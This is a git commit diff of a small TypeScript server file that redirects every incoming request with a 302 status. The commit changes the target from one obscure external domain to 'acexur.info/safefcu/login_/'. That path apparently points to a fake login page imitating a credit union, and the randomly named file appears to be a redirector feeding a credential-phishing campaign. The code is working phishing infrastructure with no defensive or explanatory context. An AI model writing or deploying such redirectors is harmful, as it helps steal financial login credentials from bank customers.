0564e6f451e2ff3c8949e845c304d81a37faad0d
Havillah1010 <agentpatrickjones@gmail.com>
2025-10-16 13:32:17 +0100

    Update potl4tch5vvc.ts

--- potl4tch5vvc.ts
+++ potl4tch5vvc.ts
@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://acedigiaceeonpi.ws/pimaa/",
+      Location: "https://acexur.info/safefcu/login_/",
     },
   });
 });
